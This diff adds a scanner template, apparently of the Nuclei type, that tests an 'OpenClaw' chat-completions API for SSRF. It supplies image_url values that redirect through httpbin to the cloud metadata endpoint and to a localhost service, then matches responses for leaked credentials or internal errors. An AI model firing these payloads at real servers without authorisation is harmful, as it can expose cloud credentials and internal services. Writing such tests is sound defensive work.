@@ -1,0 +1,74 @@
+id: openclaw-ssrf-dns-rebind
+
+info:
+  name: OpenClaw SSRF via Redirect-Based DNS Rebinding
+  author: LobsterGuard
+  severity: high
+  description: |
+    Tests whether OpenClaw follows HTTP redirects when fetching external
+    resources (e.g. image_url in chat completions), allowing an attacker
+    to redirect the server to internal services. The redirect chain
+    targets the cloud metadata endpoint (169.254.169.254) which should
+    be blocked by SSRF protections. If the server follows the redirect
+    or returns internal error details, SSRF filtering is incomplete.
+  reference:
+    - https://github.com/lobster-guard/openclaw-security
+  tags: openclaw,ssrf,dns-rebinding,redirect
+  metadata:
+    chain_id: 44
+
+http:
+  - raw:
+      - |
+        POST /v1/chat/completions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"model":"default","messages":[{"role":"user","content":[{"type":"text","text":"Describe this image"},{"type":"image_url","image_url":{"url":"http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"}}]}]}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "security-credentials"
+          - "instance-id"
+          - "iam"
+          - "meta-data"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "ECONNREFUSED"
+          - "ENOTFOUND"
+          - "ETIMEDOUT"
+          - "connect EHOSTUNREACH"
+        condition: or
+
+  - raw:
+      - |
+        POST /v1/chat/completions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"model":"default","messages":[{"role":"user","content":[{"type":"text","text":"Describe this image"},{"type":"image_url","image_url":{"url":"http://httpbin.org/redirect-to?url=http://127.0.0.1:18789/healthz"}}]}]}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ok"
+          - "healthy"
+          - "status"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "ECONNREFUSED"
+          - "127.0.0.1"
+          - "localhost"
+        condition: or
